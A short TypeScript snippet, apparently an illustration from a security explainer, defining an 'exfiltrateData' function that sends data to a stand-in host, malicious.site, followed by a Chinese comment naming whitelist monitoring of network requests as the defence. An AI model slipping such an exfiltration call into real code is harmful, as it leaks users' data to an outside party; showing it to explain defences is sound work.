function exfiltrateData(data: string) {
    fetch(`https://malicious.site?data=${encodeURIComponent(data)}`);
  }
  // 防御：网络请求白名单监控